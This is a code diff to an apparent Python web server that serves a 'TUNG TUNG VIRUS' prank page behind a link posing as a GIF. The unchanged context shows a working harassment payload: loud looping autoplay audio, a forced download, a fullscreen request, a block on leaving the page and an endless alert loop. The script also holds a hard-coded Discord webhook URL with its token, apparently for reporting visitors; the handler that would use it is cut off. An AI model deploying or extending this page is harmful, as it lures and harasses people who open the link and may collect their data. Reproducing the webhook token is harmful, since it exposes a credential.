@@ -6,7 +6,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QH
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-# Short & stable annoying page with loud Tung Tung song
+# Simple & stable annoying page with loud Tung Tung song
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
@@ -23,7 +23,7 @@ ANNOY_HTML = """
 <body>
   <div id="overlay">
     <h1>TUNG TUNG VIRUS</h1>
-    <p>LOUD MODE ACTIVATED 🔥</p>
+    <p>LOUD MODE ON 🔥</p>
   </div>
 
   <audio id="song" autoplay loop>
@@ -31,27 +31,30 @@ ANNOY_HTML = """
   </audio>
 
   <script>
-    // Loud Tung Tung song
     const audio = document.getElementById("song");
     audio.volume = 1.0;
-    audio.play().catch(() => { setTimeout(() => audio.play(), 300); });
+
+    function playAudio() {
+      audio.play().catch(() => setTimeout(playAudio, 300));
+    }
+    playAudio();
 
     // Force GIF download
     const link = document.createElement('a');
-    link.href = "%s";
+    link.href = "{0}";
     link.download = "tung-tung-virus.gif";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
 
     // Annoying stuff
-    document.documentElement.requestFullscreen?.().catch(() => {});
+    document.documentElement.requestFullscreen?.().catch(() => {{}});
     window.onbeforeunload = () => "TUNG TUNG says NO!";
     setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
   </script>
 </body>
 </html>
-""" % FAKE_IMAGE_URL
+""".format(FAKE_IMAGE_URL)
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
